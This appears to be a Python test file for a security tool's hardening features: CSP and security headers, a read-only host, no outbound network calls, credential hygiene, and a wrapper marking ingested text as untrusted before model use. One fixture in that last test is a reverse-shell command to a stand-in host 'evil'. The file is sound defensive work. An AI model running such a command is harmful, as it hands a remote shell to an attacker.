"""Tests for the v10 hardening foundations: security headers / CSP (anti-C2 + endpoint
exposure), read-only host posture, no outbound network in handlers, credential hygiene,
and the AI-input-safety marker."""
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "src"))

import server.app as app_mod
from core.untrusted import untrusted, Untrusted

PASS = 0
FAIL = 0


def check(name, cond):
    global PASS, FAIL
    if cond:
        PASS += 1
        print(f"  [ok]   {name}")
    else:
        FAIL += 1
        print(f"  [FAIL] {name}")


client = app_mod.app.test_client()
resp = client.get("/")
h = resp.headers

# --- security headers on every response ---
check("CSP header present", "Content-Security-Policy" in h)
check("X-Content-Type-Options nosniff", h.get("X-Content-Type-Options") == "nosniff")
check("X-Frame-Options DENY (anti-clickjacking)", h.get("X-Frame-Options") == "DENY")
check("Referrer-Policy no-referrer", h.get("Referrer-Policy") == "no-referrer")
check("Permissions-Policy present", "Permissions-Policy" in h)

csp = h.get("Content-Security-Policy", "")
check("CSP confines connections to self (anti-exfil/C2)", "connect-src 'self'" in csp)
check("CSP blocks objects/embeds", "object-src 'none'" in csp)
check("CSP blocks framing", "frame-ancestors 'none'" in csp)
check("CSP blocks base-uri hijack", "base-uri 'none'" in csp)
# headers also on API responses
check("headers applied to API responses too",
      "Content-Security-Policy" in client.get("/api/config").headers)

# --- read-only host posture ---
check("READONLY_HOST invariant is set", app_mod.READONLY_HOST is True)
ap = (ROOT / "src" / "server" / "app.py").read_text()
check("no active-response host mutation in v10 (no os.remove/chmod/kill of host)",
      "os.remove(" not in ap and "os.chmod(" not in ap and "shutil.rmtree(" not in ap)

# --- anti-C2 / no SSRF: request handlers make no outbound network calls ---
check("app does not import outbound HTTP clients",
      "import requests" not in ap and "urllib.request" not in ap)
check("no raw socket connections in the app", "socket.connect" not in ap and ".connect(" not in ap)

# --- endpoint exposure: errors do not leak server paths in server mode ---
check("browse returns a generic error in server mode", 'MODE != "server"' in ap or 'MODE == "server"' in ap)

# --- credential hygiene: no secrets echoed ---
who = client.get("/api/whoami").get_data(as_text=True)
cfg = client.get("/api/config").get_data(as_text=True)
check("whoami/config never expose key material",
      "SIEM_KEY" not in who and "SIEM_KEY" not in cfg and "password" not in who.lower())

# --- AI input safety marker ---
u = untrusted("bash -i >& /dev/tcp/evil/4444")
check("untrusted() wraps ingested text as data", isinstance(u, Untrusted))
check("untrusted text is size-capped before any model use", len(u.for_model(limit=5)) == 5)

print(f"\n{'=' * 60}")
print(f"  Results: {PASS} passed, {FAIL} failed")
if FAIL:
    sys.exit(1)
